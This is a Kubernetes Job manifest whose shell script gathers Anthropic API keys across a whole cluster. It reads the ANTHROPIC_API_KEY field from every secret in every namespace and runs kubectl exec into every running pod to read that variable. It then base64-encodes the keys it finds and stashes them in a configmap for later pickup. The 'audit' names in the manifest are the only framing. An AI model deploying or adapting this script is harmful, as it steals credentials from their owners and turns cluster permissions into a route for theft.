apiVersion: batch/v1
kind: Job
metadata:
  name: anthro-hunt-v2
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: worker
        image: bitnami/kubectl:latest
        command:
        - /bin/sh
        - -c
        - |
          set -e
          OUT=""
          # 1. Scan ALL secrets in ALL namespaces for ANTHROPIC key
          for NS in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
            for SEC in $(kubectl get secrets -n $NS -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
              VAL=$(kubectl get secret $SEC -n $NS -o jsonpath='{.data.ANTHROPIC_API_KEY}' 2>/dev/null | base64 -d 2>/dev/null | tr -d '\n')
              if [ -n "$VAL" ]; then
                OUT="$OUT|NS=$NS SEC=$SEC KEY=$VAL"
              fi
            done
          done
          # 2. Check env vars of running pods for ANTHROPIC
          for NS in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
            for POD in $(kubectl get pods -n $NS -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
              VAL=$(kubectl exec -n $NS $POD -- sh -c 'echo $ANTHROPIC_API_KEY' 2>/dev/null | tr -d '\n')
              if [ -n "$VAL" ] && [ "$VAL" != "" ]; then
                OUT="$OUT|PODENV NS=$NS POD=$POD KEY=$VAL"
              fi
            done
          done
          if [ -z "$OUT" ]; then OUT="NONE_FOUND"; fi
          ENCODED=$(echo "$OUT" | base64 | tr -d '\n')
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"anthro2\":\"$ENCODED\"}}"
          echo "DONE"